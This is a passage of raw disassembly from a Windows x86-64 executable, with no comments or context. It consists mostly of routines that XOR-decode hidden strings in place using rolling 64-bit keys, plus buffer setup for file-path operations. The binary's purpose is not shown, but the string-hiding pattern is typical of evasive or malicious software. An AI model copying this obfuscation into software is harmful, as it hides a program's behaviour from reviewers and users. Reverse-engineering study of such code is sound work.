   14000177f:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140001784:	45 31 c0             	xor    %r8d,%r8d
   140001787:	4c 89 e2             	mov    %r12,%rdx
   14000178a:	48 8d 0d 0f a6 00 00 	lea    0xa60f(%rip),%rcx        # 0x14000bda0
   140001791:	49 89 04 24          	mov    %rax,(%r12)
   140001795:	b8 ed 39 00 00       	mov    $0x39ed,%eax
   14000179a:	66 41 89 44 24 08    	mov    %ax,0x8(%r12)
   1400017a0:	41 c6 07 01          	movb   $0x1,(%r15)
   1400017a4:	e8 37 48 00 00       	call   0x140005fe0
   1400017a9:	41 80 7c 24 0a 00    	cmpb   $0x0,0xa(%r12)
   1400017af:	75 57                	jne    0x140001808
   1400017b1:	4c 89 e1             	mov    %r12,%rcx
   1400017b4:	ff 15 ca bb 38 00    	call   *0x38bbca(%rip)        # 0x14038d384
   1400017ba:	49 89 d8             	mov    %rbx,%r8
   1400017bd:	4c 89 f1             	mov    %r14,%rcx
   1400017c0:	48 89 c2             	mov    %rax,%rdx
   1400017c3:	e8 18 2a 00 00       	call   0x1400041e0
   1400017c8:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   1400017cc:	49 89 f9             	mov    %rdi,%r9
   1400017cf:	48 89 f2             	mov    %rsi,%rdx
   1400017d2:	48 8b 84 24 d8 02 00 	mov    0x2d8(%rsp),%rax
   1400017d9:	00 
   1400017da:	4c 89 f1             	mov    %r14,%rcx
   1400017dd:	4c 8b 84 24 d0 02 00 	mov    0x2d0(%rsp),%r8
   1400017e4:	00 
   1400017e5:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400017ea:	e8 41 35 00 00       	call   0x140004d30
   1400017ef:	45 84 ed             	test   %r13b,%r13b
   1400017f2:	48 89 c3             	mov    %rax,%rbx
   1400017f5:	75 39                	jne    0x140001830
   1400017f7:	48 89 d9             	mov    %rbx,%rcx
   1400017fa:	e8 8d 39 00 00       	call   0x14000518c
   1400017ff:	e9 59 fe ff ff       	jmp    0x14000165d
   140001804:	0f 1f 40 00          	nopl   0x0(%rax)
   140001808:	48 b8 cf 2f 2f ff ff 	movabs $0xed9595ffff2f2fcf,%rax
   14000180f:	95 95 ed 
   140001812:	41 c6 44 24 0a 00    	movb   $0x0,0xa(%r12)
   140001818:	49 31 04 24          	xor    %rax,(%r12)
   14000181c:	66 41 81 74 24 08 ed 	xorw   $0x39ed,0x8(%r12)
   140001823:	39 
   140001824:	eb 8b                	jmp    0x1400017b1
   140001826:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000182d:	00 00 00 
   140001830:	48 89 c1             	mov    %rax,%rcx
   140001833:	e8 28 fd ff ff       	call   0x140001560
   140001838:	eb bd                	jmp    0x1400017f7
   14000183a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001840:	41 57                	push   %r15
   140001842:	41 56                	push   %r14
   140001844:	41 55                	push   %r13
   140001846:	41 54                	push   %r12
   140001848:	55                   	push   %rbp
   140001849:	57                   	push   %rdi
   14000184a:	56                   	push   %rsi
   14000184b:	53                   	push   %rbx
   14000184c:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001853:	0f 29 74 24 60       	movaps %xmm6,0x60(%rsp)
   140001858:	0f 29 7c 24 70       	movaps %xmm7,0x70(%rsp)
   14000185d:	89 d5                	mov    %edx,%ebp
   14000185f:	49 89 ce             	mov    %rcx,%r14
   140001862:	85 ed                	test   %ebp,%ebp
   140001864:	0f 84 fb 00 00 00    	je     0x140001965
   14000186a:	48 8d 0d 0f bd 00 00 	lea    0xbd0f(%rip),%rcx        # 0x14000d580
   140001871:	31 db                	xor    %ebx,%ebx
   140001873:	48 be cf 19 9f c5 83 	movabs $0xdbaf4383c59f19cf,%rsi
   14000187a:	43 af db 
   14000187d:	e8 1e 50 00 00       	call   0x1400068a0
   140001882:	48 8d 0d d7 bc 00 00 	lea    0xbcd7(%rip),%rcx        # 0x14000d560
   140001889:	49 89 c7             	mov    %rax,%r15
   14000188c:	e8 0f 50 00 00       	call   0x1400068a0
   140001891:	66 0f 6f 3d a7 77 38 	movdqa 0x3877a7(%rip),%xmm7        # 0x140389040
   140001898:	00 
   140001899:	49 89 c4             	mov    %rax,%r12
   14000189c:	66 0f 6f 35 ac 77 38 	movdqa 0x3877ac(%rip),%xmm6        # 0x140389050
   1400018a3:	00 
   1400018a4:	48 8d 05 65 a3 00 00 	lea    0xa365(%rip),%rax        # 0x14000bc10
   1400018ab:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400018b0:	41 80 3f 00          	cmpb   $0x0,(%r15)
   1400018b4:	41 89 dd             	mov    %ebx,%r13d
   1400018b7:	0f 29 7c 24 30       	movaps %xmm7,0x30(%rsp)
   1400018bc:	41 0f b6 3c 1e       	movzbl (%r14,%rbx,1),%edi
   1400018c1:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
   1400018c6:	c6 44 24 50 cf       	movb   $0xcf,0x50(%rsp)
   1400018cb:	75 4b                	jne    0x140001918
   1400018cd:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400018d2:	41 c6 44 24 21 01    	movb   $0x1,0x21(%r12)
   1400018d8:	45 31 c0             	xor    %r8d,%r8d
   1400018db:	4c 89 e2             	mov    %r12,%rdx
   1400018de:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400018e3:	49 89 04 24          	mov    %rax,(%r12)
   1400018e7:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400018ec:	49 89 44 24 08       	mov    %rax,0x8(%r12)
   1400018f1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400018f6:	49 89 44 24 10       	mov    %rax,0x10(%r12)
   1400018fb:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001900:	49 89 44 24 18       	mov    %rax,0x18(%r12)
   140001905:	b8 cf ff ff ff       	mov    $0xffffffcf,%eax
   14000190a:	41 88 44 24 20       	mov    %al,0x20(%r12)
   14000190f:	41 c6 07 01          	movb   $0x1,(%r15)
   140001913:	e8 c8 46 00 00       	call   0x140005fe0
   140001918:	41 80 7c 24 21 00    	cmpb   $0x0,0x21(%r12)
   14000191e:	74 2c                	je     0x14000194c
   140001920:	31 c0                	xor    %eax,%eax
   140001922:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001928:	48 89 c1             	mov    %rax,%rcx
   14000192b:	48 89 f2             	mov    %rsi,%rdx
   14000192e:	83 e1 07             	and    $0x7,%ecx
   140001931:	48 c1 e1 03          	shl    $0x3,%rcx
   140001935:	48 d3 ea             	shr    %cl,%rdx
   140001938:	41 30 14 04          	xor    %dl,(%r12,%rax,1)
   14000193c:	48 83 c0 01          	add    $0x1,%rax
   140001940:	48 83 f8 21          	cmp    $0x21,%rax
   140001944:	75 e2                	jne    0x140001928
   140001946:	41 c6 44 24 21 00    	movb   $0x0,0x21(%r12)
   14000194c:	41 83 e5 1f          	and    $0x1f,%r13d
   140001950:	43 32 3c 2c          	xor    (%r12,%r13,1),%dil
   140001954:	41 88 3c 1e          	mov    %dil,(%r14,%rbx,1)
   140001958:	48 83 c3 01          	add    $0x1,%rbx
   14000195c:	48 39 dd             	cmp    %rbx,%rbp
   14000195f:	0f 85 4b ff ff ff    	jne    0x1400018b0
   140001965:	0f 28 74 24 60       	movaps 0x60(%rsp),%xmm6
   14000196a:	0f 28 7c 24 70       	movaps 0x70(%rsp),%xmm7
   14000196f:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001976:	5b                   	pop    %rbx
   140001977:	5e                   	pop    %rsi
   140001978:	5f                   	pop    %rdi
   140001979:	5d                   	pop    %rbp
   14000197a:	41 5c                	pop    %r12
   14000197c:	41 5d                	pop    %r13
   14000197e:	41 5e                	pop    %r14
   140001980:	41 5f                	pop    %r15
   140001982:	c3                   	ret
   140001983:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000198a:	00 00 00 00 
   14000198e:	66 90                	xchg   %ax,%ax
   140001990:	41 57                	push   %r15
   140001992:	b8 78 15 01 00       	mov    $0x11578,%eax
   140001997:	41 56                	push   %r14
   140001999:	41 55                	push   %r13
   14000199b:	41 54                	push   %r12
   14000199d:	55                   	push   %rbp
   14000199e:	57                   	push   %rdi
   14000199f:	56                   	push   %rsi
   1400019a0:	53                   	push   %rbx
   1400019a1:	e8 6a 4d 00 00       	call   0x140006710
   1400019a6:	48 29 c4             	sub    %rax,%rsp
   1400019a9:	0f 29 b4 24 40 15 01 	movaps %xmm6,0x11540(%rsp)
   1400019b0:	00 
   1400019b1:	0f 29 bc 24 50 15 01 	movaps %xmm7,0x11550(%rsp)
   1400019b8:	00 
   1400019b9:	44 0f 29 84 24 60 15 	movaps %xmm8,0x11560(%rsp)
   1400019c0:	01 00 
   1400019c2:	31 c9                	xor    %ecx,%ecx
   1400019c4:	48 c7 44 24 58 80 2e 	movq   $0xfffffffff70f2e80,0x58(%rsp)
   1400019cb:	0f f7 
   1400019cd:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400019d2:	e8 2a 38 00 00       	call   0x140005201
   1400019d7:	48 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%rbx
   1400019de:	00 
   1400019df:	31 d2                	xor    %edx,%edx
   1400019e1:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400019e7:	48 89 d9             	mov    %rbx,%rcx
   1400019ea:	e8 e1 a0 00 00       	call   0x14000bad0
   1400019ef:	8b 05 7b 76 38 00    	mov    0x38767b(%rip),%eax        # 0x140389070
   1400019f5:	48 8d 0d 04 bc 00 00 	lea    0xbc04(%rip),%rcx        # 0x14000d600
   1400019fc:	66 0f 6f 05 5c 76 38 	movdqa 0x38765c(%rip),%xmm0        # 0x140389060
   140001a03:	00 
   140001a04:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140001a0b:	00 
   140001a0c:	89 84 24 50 15 00 00 	mov    %eax,0x1550(%rsp)
   140001a13:	e8 88 4e 00 00       	call   0x1400068a0
   140001a18:	48 8d 0d c1 bb 00 00 	lea    0xbbc1(%rip),%rcx        # 0x14000d5e0
   140001a1f:	80 38 00             	cmpb   $0x0,(%rax)
   140001a22:	48 89 c6             	mov    %rax,%rsi
   140001a25:	0f 84 bd 15 00 00    	je     0x140002fe8
   140001a2b:	e8 70 4e 00 00       	call   0x1400068a0
   140001a30:	48 89 c5             	mov    %rax,%rbp
   140001a33:	80 7d 14 00          	cmpb   $0x0,0x14(%rbp)
   140001a37:	74 27                	je     0x140001a60
   140001a39:	48 b8 bf cf cf 95 95 	movabs $0xf3abab9595cfcfbf,%rax
   140001a40:	ab ab f3 
   140001a43:	c6 45 14 00          	movb   $0x0,0x14(%rbp)
   140001a47:	48 31 45 00          	xor    %rax,0x0(%rbp)
   140001a4b:	48 b8 f3 d5 d5 b7 b7 	movabs $0x4f4fb7b7d5d5f3,%rax
   140001a52:	4f 4f 00 
   140001a55:	81 75 10 bf cf cf 95 	xorl   $0x95cfcfbf,0x10(%rbp)
   140001a5c:	48 31 45 08          	xor    %rax,0x8(%rbp)
   140001a60:	8b 05 2a 76 38 00    	mov    0x38762a(%rip),%eax        # 0x140389090
   140001a66:	bf 95 ab ff ff       	mov    $0xffffab95,%edi
   140001a6b:	66 0f 6f 05 0d 76 38 	movdqa 0x38760d(%rip),%xmm0        # 0x140389080
   140001a72:	00 
   140001a73:	48 8d 0d 46 bb 00 00 	lea    0xbb46(%rip),%rcx        # 0x14000d5c0
   140001a7a:	66 89 bc 24 54 15 00 	mov    %di,0x1554(%rsp)
   140001a81:	00 
   140001a82:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140001a89:	00 
   140001a8a:	89 84 24 50 15 00 00 	mov    %eax,0x1550(%rsp)
   140001a91:	e8 0a 4e 00 00       	call   0x1400068a0
   140001a96:	48 8d 0d 03 bb 00 00 	lea    0xbb03(%rip),%rcx        # 0x14000d5a0
   140001a9d:	48 89 c7             	mov    %rax,%rdi
   140001aa0:	e8 fb 4d 00 00       	call   0x1400068a0
   140001aa5:	80 3f 00             	cmpb   $0x0,(%rdi)
   140001aa8:	48 89 c6             	mov    %rax,%rsi
   140001aab:	75 3c                	jne    0x140001ae9
   140001aad:	c6 40 16 01          	movb   $0x1,0x16(%rax)
   140001ab1:	45 31 c0             	xor    %r8d,%r8d
   140001ab4:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140001abb:	00 
   140001abc:	48 89 f2             	mov    %rsi,%rdx
   140001abf:	48 8d 0d 7a a1 00 00 	lea    0xa17a(%rip),%rcx        # 0x14000bc40
   140001ac6:	48 89 06             	mov    %rax,(%rsi)
   140001ac9:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140001ad0:	00 
   140001ad1:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140001ad5:	48 8b 84 24 4e 15 00 	mov    0x154e(%rsp),%rax
   140001adc:	00 
   140001add:	48 89 46 0e          	mov    %rax,0xe(%rsi)
   140001ae1:	c6 07 01             	movb   $0x1,(%rdi)
   140001ae4:	e8 f7 44 00 00       	call   0x140005fe0
   140001ae9:	80 7e 16 00          	cmpb   $0x0,0x16(%rsi)
   140001aed:	74 2c                	je     0x140001b1b
   140001aef:	48 b8 bf cf cf 95 95 	movabs $0xf3abab9595cfcfbf,%rax
   140001af6:	ab ab f3 
   140001af9:	c6 46 16 00          	movb   $0x0,0x16(%rsi)
   140001afd:	48 31 06             	xor    %rax,(%rsi)
   140001b00:	48 b8 f3 d5 d5 b7 b7 	movabs $0x4f4fb7b7d5d5f3,%rax
   140001b07:	4f 4f 00 
   140001b0a:	81 76 10 bf cf cf 95 	xorl   $0x95cfcfbf,0x10(%rsi)
   140001b11:	48 31 46 08          	xor    %rax,0x8(%rsi)
   140001b15:	66 81 76 14 95 ab    	xorw   $0xab95,0x14(%rsi)
   140001b1b:	48 89 f1             	mov    %rsi,%rcx
   140001b1e:	4c 8b 35 5f b8 38 00 	mov    0x38b85f(%rip),%r14        # 0x14038d384
   140001b25:	be 41 09 00 00       	mov    $0x941,%esi
   140001b2a:	41 ff d6             	call   *%r14
   140001b2d:	48 8d bc 24 b0 02 00 	lea    0x2b0(%rsp),%rdi
   140001b34:	00 
   140001b35:	49 89 e8             	mov    %rbp,%r8
   140001b38:	48 89 d9             	mov    %rbx,%rcx
   140001b3b:	48 89 c2             	mov    %rax,%rdx
   140001b3e:	e8 9d 26 00 00       	call   0x1400041e0
   140001b43:	31 d2                	xor    %edx,%edx
   140001b45:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140001b4b:	48 89 f9             	mov    %rdi,%rcx
   140001b4e:	e8 7d 9f 00 00       	call   0x14000bad0
   140001b53:	66 0f 6f 05 45 75 38 	movdqa 0x387545(%rip),%xmm0        # 0x1403890a0
   140001b5a:	00 
   140001b5b:	48 8d 0d de ba 00 00 	lea    0xbade(%rip),%rcx        # 0x14000d640
   140001b62:	66 89 b4 24 50 15 00 	mov    %si,0x1550(%rsp)
   140001b69:	00 
   140001b6a:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140001b71:	00 
   140001b72:	e8 29 4d 00 00       	call   0x1400068a0
   140001b77:	48 8d 0d a2 ba 00 00 	lea    0xbaa2(%rip),%rcx        # 0x14000d620
   140001b7e:	48 89 c5             	mov    %rax,%rbp
   140001b81:	e8 1a 4d 00 00       	call   0x1400068a0
   140001b86:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   140001b8a:	48 89 c6             	mov    %rax,%rsi
   140001b8d:	75 3c                	jne    0x140001bcb
   140001b8f:	c6 40 12 01          	movb   $0x1,0x12(%rax)
   140001b93:	41 bb 41 09 00 00    	mov    $0x941,%r11d
   140001b99:	45 31 c0             	xor    %r8d,%r8d
   140001b9c:	48 89 f2             	mov    %rsi,%rdx
   140001b9f:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140001ba6:	00 
   140001ba7:	66 44 89 5e 10       	mov    %r11w,0x10(%rsi)
   140001bac:	48 8d 0d 7d a2 00 00 	lea    0xa27d(%rip),%rcx        # 0x14000be30
   140001bb3:	48 89 06             	mov    %rax,(%rsi)
   140001bb6:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140001bbd:	00 
   140001bbe:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140001bc2:	c6 45 00 01          	movb   $0x1,0x0(%rbp)
   140001bc6:	e8 15 44 00 00       	call   0x140005fe0
   140001bcb:	80 7e 12 00          	cmpb   $0x0,0x12(%rsi)
   140001bcf:	74 25                	je     0x140001bf6
   140001bd1:	48 b8 41 09 09 fb fb 	movabs $0xa77373fbfb090941,%rax
   140001bd8:	73 73 a7 
   140001bdb:	c6 46 12 00          	movb   $0x0,0x12(%rsi)
   140001bdf:	48 31 06             	xor    %rax,(%rsi)
   140001be2:	48 b8 a7 45 45 7b 7b 	movabs $0x29297b7b4545a7,%rax
   140001be9:	29 29 00 
   140001bec:	66 81 76 10 41 09    	xorw   $0x941,0x10(%rsi)
   140001bf2:	48 31 46 08          	xor    %rax,0x8(%rsi)
   140001bf6:	49 89 f0             	mov    %rsi,%r8
   140001bf9:	48 89 da             	mov    %rbx,%rdx
   140001bfc:	48 8d ac 24 c0 04 00 	lea    0x4c0(%rsp),%rbp
   140001c03:	00 
   140001c04:	48 89 f9             	mov    %rdi,%rcx
   140001c07:	e8 d4 25 00 00       	call   0x1400041e0
   140001c0c:	31 d2                	xor    %edx,%edx
   140001c0e:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140001c14:	48 89 e9             	mov    %rbp,%rcx
   140001c17:	e8 b4 9e 00 00       	call   0x14000bad0
   140001c1c:	48 8b 05 cd 74 38 00 	mov    0x3874cd(%rip),%rax        # 0x1403890f0
   140001c23:	41 ba 07 81 ff ff    	mov    $0xffff8107,%r10d
   140001c29:	66 0f 6f 05 7f 74 38 	movdqa 0x38747f(%rip),%xmm0        # 0x1403890b0
   140001c30:	00 
   140001c31:	48 8d 0d 48 ba 00 00 	lea    0xba48(%rip),%rcx        # 0x14000d680
   140001c38:	66 44 89 94 24 8c 15 	mov    %r10w,0x158c(%rsp)
   140001c3f:	00 00 
   140001c41:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140001c48:	00 
   140001c49:	66 0f 6f 05 6f 74 38 	movdqa 0x38746f(%rip),%xmm0        # 0x1403890c0
   140001c50:	00 
   140001c51:	48 89 84 24 80 15 00 	mov    %rax,0x1580(%rsp)
   140001c58:	00 
   140001c59:	8b 05 99 74 38 00    	mov    0x387499(%rip),%eax        # 0x1403890f8
   140001c5f:	0f 29 84 24 50 15 00 	movaps %xmm0,0x1550(%rsp)
   140001c66:	00 
   140001c67:	66 0f 6f 05 61 74 38 	movdqa 0x387461(%rip),%xmm0        # 0x1403890d0
   140001c6e:	00 
   140001c6f:	0f 29 84 24 60 15 00 	movaps %xmm0,0x1560(%rsp)
   140001c76:	00 
   140001c77:	66 0f 6f 05 61 74 38 	movdqa 0x387461(%rip),%xmm0        # 0x1403890e0
   140001c7e:	00 
   140001c7f:	89 84 24 88 15 00 00 	mov    %eax,0x1588(%rsp)
   140001c86:	0f 29 84 24 70 15 00 	movaps %xmm0,0x1570(%rsp)
   140001c8d:	00 
   140001c8e:	e8 0d 4c 00 00       	call   0x1400068a0
   140001c93:	48 8d 0d c6 b9 00 00 	lea    0xb9c6(%rip),%rcx        # 0x14000d660
   140001c9a:	80 38 00             	cmpb   $0x0,(%rax)
   140001c9d:	49 89 c4             	mov    %rax,%r12
   140001ca0:	0f 84 a3 12 00 00    	je     0x140002f49
   140001ca6:	e8 f5 4b 00 00       	call   0x1400068a0
   140001cab:	48 89 c6             	mov    %rax,%rsi
   140001cae:	80 7e 4e 00          	cmpb   $0x0,0x4e(%rsi)
   140001cb2:	74 2e                	je     0x140001ce2
   140001cb4:	49 b8 11 f5 bb 7d 01 	movabs $0x8107f5017dbbf511,%r8
   140001cbb:	f5 07 81 
   140001cbe:	31 c0                	xor    %eax,%eax
   140001cc0:	48 89 c1             	mov    %rax,%rcx
   140001cc3:	4c 89 c2             	mov    %r8,%rdx
   140001cc6:	83 e1 07             	and    $0x7,%ecx
   140001cc9:	48 c1 e1 03          	shl    $0x3,%rcx
   140001ccd:	48 d3 ea             	shr    %cl,%rdx
   140001cd0:	66 31 14 46          	xor    %dx,(%rsi,%rax,2)
   140001cd4:	48 83 c0 01          	add    $0x1,%rax
   140001cd8:	48 83 f8 27          	cmp    $0x27,%rax
   140001cdc:	75 e2                	jne    0x140001cc0
   140001cde:	c6 46 4e 00          	movb   $0x0,0x4e(%rsi)
   140001ce2:	49 89 f0             	mov    %rsi,%r8
   140001ce5:	48 89 da             	mov    %rbx,%rdx
   140001ce8:	48 89 e9             	mov    %rbp,%rcx
   140001ceb:	e8 f0 24 00 00       	call   0x1400041e0
   140001cf0:	48 8d b4 24 40 15 00 	lea    0x1540(%rsp),%rsi
   140001cf7:	00 
   140001cf8:	41 b8 a2 00 00 00    	mov    $0xa2,%r8d
   140001cfe:	48 8d 15 1b a3 00 00 	lea    0xa31b(%rip),%rdx        # 0x14000c020
   140001d05:	48 89 f1             	mov    %rsi,%rcx
   140001d08:	e8 bb 9d 00 00       	call   0x14000bac8
   140001d0d:	48 8d 0d ac b9 00 00 	lea    0xb9ac(%rip),%rcx        # 0x14000d6c0
   140001d14:	e8 87 4b 00 00       	call   0x1400068a0
   140001d19:	48 8d 0d 80 b9 00 00 	lea    0xb980(%rip),%rcx        # 0x14000d6a0
   140001d20:	80 38 00             	cmpb   $0x0,(%rax)
   140001d23:	49 89 c5             	mov    %rax,%r13
   140001d26:	0f 84 e1 11 00 00    	je     0x140002f0d
   140001d2c:	e8 6f 4b 00 00       	call   0x1400068a0
   140001d31:	49 89 c4             	mov    %rax,%r12
   140001d34:	41 80 bc 24 a2 00 00 	cmpb   $0x0,0xa2(%r12)
   140001d3b:	00 00 
   140001d3d:	74 39                	je     0x140001d78
   140001d3f:	49 b8 cb bf 83 cf 7f 	movabs $0x779d037fcf83bfcb,%r8
   140001d46:	03 9d 77 
   140001d49:	31 c0                	xor    %eax,%eax
   140001d4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d50:	48 89 c1             	mov    %rax,%rcx
   140001d53:	4c 89 c2             	mov    %r8,%rdx
   140001d56:	83 e1 07             	and    $0x7,%ecx
   140001d59:	48 c1 e1 03          	shl    $0x3,%rcx
   140001d5d:	48 d3 ea             	shr    %cl,%rdx
   140001d60:	66 41 31 14 44       	xor    %dx,(%r12,%rax,2)
   140001d65:	48 83 c0 01          	add    $0x1,%rax
   140001d69:	48 83 f8 51          	cmp    $0x51,%rax
   140001d6d:	75 e1                	jne    0x140001d50
   140001d6f:	41 c6 84 24 a2 00 00 	movb   $0x0,0xa2(%r12)
   140001d76:	00 00 
   140001d78:	4d 89 e1             	mov    %r12,%r9
   140001d7b:	49 89 e8             	mov    %rbp,%r8
   140001d7e:	48 89 da             	mov    %rbx,%rdx
   140001d81:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140001d86:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001d8b:	e8 b0 1d 00 00       	call   0x140003b40
   140001d90:	41 b8 46 03 00 00    	mov    $0x346,%r8d
   140001d96:	48 89 f1             	mov    %rsi,%rcx
   140001d99:	48 8d 15 40 a3 00 00 	lea    0xa340(%rip),%rdx        # 0x14000c0e0
   140001da0:	e8 23 9d 00 00       	call   0x14000bac8
   140001da5:	48 8d 0d 54 b9 00 00 	lea    0xb954(%rip),%rcx        # 0x14000d700
   140001dac:	e8 ef 4a 00 00       	call   0x1400068a0
   140001db1:	48 8d 0d 28 b9 00 00 	lea    0xb928(%rip),%rcx        # 0x14000d6e0
   140001db8:	80 38 00             	cmpb   $0x0,(%rax)
   140001dbb:	49 89 c5             	mov    %rax,%r13
   140001dbe:	0f 84 0d 11 00 00    	je     0x140002ed1
   140001dc4:	e8 d7 4a 00 00       	call   0x1400068a0
   140001dc9:	49 89 c4             	mov    %rax,%r12
   140001dcc:	41 80 bc 24 46 03 00 	cmpb   $0x0,0x346(%r12)
   140001dd3:	00 00 
   140001dd5:	74 3b                	je     0x140001e12
   140001dd7:	49 b8 1b 4b 4b 3b b1 	movabs $0x991135b13b4b4b1b,%r8
   140001dde:	35 11 99 
   140001de1:	31 c0                	xor    %eax,%eax
   140001de3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001de8:	48 89 c1             	mov    %rax,%rcx
   140001deb:	4c 89 c2             	mov    %r8,%rdx
   140001dee:	83 e1 07             	and    $0x7,%ecx
   140001df1:	48 c1 e1 03          	shl    $0x3,%rcx
   140001df5:	48 d3 ea             	shr    %cl,%rdx
   140001df8:	66 41 31 14 44       	xor    %dx,(%r12,%rax,2)
   140001dfd:	48 83 c0 01          	add    $0x1,%rax
   140001e01:	48 3d a3 01 00 00    	cmp    $0x1a3,%rax
   140001e07:	75 df                	jne    0x140001de8
   140001e09:	41 c6 84 24 46 03 00 	movb   $0x0,0x346(%r12)
   140001e10:	00 00 
   140001e12:	4d 89 e1             	mov    %r12,%r9
   140001e15:	31 c9                	xor    %ecx,%ecx
   140001e17:	49 89 f8             	mov    %rdi,%r8
   140001e1a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001e1f:	48 89 da             	mov    %rbx,%rdx
   140001e22:	e8 19 1d 00 00       	call   0x140003b40
   140001e27:	41 b8 30 01 00 00    	mov    $0x130,%r8d
   140001e2d:	48 89 f1             	mov    %rsi,%rcx
   140001e30:	48 8d 15 09 a6 00 00 	lea    0xa609(%rip),%rdx        # 0x14000c440
   140001e37:	e8 8c 9c 00 00       	call   0x14000bac8
   140001e3c:	48 8d 0d fd b8 00 00 	lea    0xb8fd(%rip),%rcx        # 0x14000d740
   140001e43:	e8 58 4a 00 00       	call   0x1400068a0
   140001e48:	48 8d 0d d1 b8 00 00 	lea    0xb8d1(%rip),%rcx        # 0x14000d720
   140001e4f:	80 38 00             	cmpb   $0x0,(%rax)
   140001e52:	49 89 c5             	mov    %rax,%r13
   140001e55:	0f 84 3a 10 00 00    	je     0x140002e95
   140001e5b:	e8 40 4a 00 00       	call   0x1400068a0
   140001e60:	49 89 c4             	mov    %rax,%r12
   140001e63:	41 80 bc 24 30 01 00 	cmpb   $0x0,0x130(%r12)
   140001e6a:	00 00 
   140001e6c:	74 3c                	je     0x140001eaa
   140001e6e:	49 b8 71 0b c9 bd 4d 	movabs $0x8373ad4dbdc90b71,%r8
   140001e75:	ad 73 83 
   140001e78:	31 c0                	xor    %eax,%eax
   140001e7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001e80:	48 89 c1             	mov    %rax,%rcx
   140001e83:	4c 89 c2             	mov    %r8,%rdx
   140001e86:	83 e1 07             	and    $0x7,%ecx
   140001e89:	48 c1 e1 03          	shl    $0x3,%rcx
   140001e8d:	48 d3 ea             	shr    %cl,%rdx
   140001e90:	66 41 31 14 44       	xor    %dx,(%r12,%rax,2)
   140001e95:	48 83 c0 01          	add    $0x1,%rax
   140001e99:	48 3d 98 00 00 00    	cmp    $0x98,%rax
   140001e9f:	75 df                	jne    0x140001e80
   140001ea1:	41 c6 84 24 30 01 00 	movb   $0x0,0x130(%r12)
   140001ea8:	00 00 
   140001eaa:	4d 89 e1             	mov    %r12,%r9
   140001ead:	31 c9                	xor    %ecx,%ecx
   140001eaf:	49 89 f8             	mov    %rdi,%r8
   140001eb2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001eb7:	4c 8d ac 24 d0 06 00 	lea    0x6d0(%rsp),%r13
   140001ebe:	00 
   140001ebf:	48 89 da             	mov    %rbx,%rdx
   140001ec2:	e8 79 1c 00 00       	call   0x140003b40
   140001ec7:	31 d2                	xor    %edx,%edx
   140001ec9:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140001ecf:	4c 89 e9             	mov    %r13,%rcx
   140001ed2:	e8 f9 9b 00 00       	call   0x14000bad0
   140001ed7:	31 c9                	xor    %ecx,%ecx
   140001ed9:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001edf:	4c 89 ea             	mov    %r13,%rdx
   140001ee2:	ff 15 7c b3 38 00    	call   *0x38b37c(%rip)        # 0x14038d264
   140001ee8:	4c 8d a4 24 e0 08 00 	lea    0x8e0(%rsp),%r12
   140001eef:	00 
   140001ef0:	31 d2                	xor    %edx,%edx
   140001ef2:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140001ef8:	4c 89 e1             	mov    %r12,%rcx
   140001efb:	e8 d0 9b 00 00       	call   0x14000bad0
   140001f00:	66 0f 6f 05 f8 71 38 	movdqa 0x3871f8(%rip),%xmm0        # 0x140389100
   140001f07:	00 
   140001f08:	41 b9 55 b5 ff ff    	mov    $0xffffb555,%r9d
   140001f0e:	8b 05 1c 72 38 00    	mov    0x38721c(%rip),%eax        # 0x140389130
   140001f14:	48 8d 0d a5 b8 00 00 	lea    0xb8a5(%rip),%rcx        # 0x14000d7c0
   140001f1b:	66 44 89 8c 24 74 15 	mov    %r9w,0x1574(%rsp)
   140001f22:	00 00 
   140001f24:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140001f2b:	00 
   140001f2c:	66 0f 6f 05 dc 71 38 	movdqa 0x3871dc(%rip),%xmm0        # 0x140389110
   140001f33:	00 
   140001f34:	0f 29 84 24 50 15 00 	movaps %xmm0,0x1550(%rsp)
   140001f3b:	00 
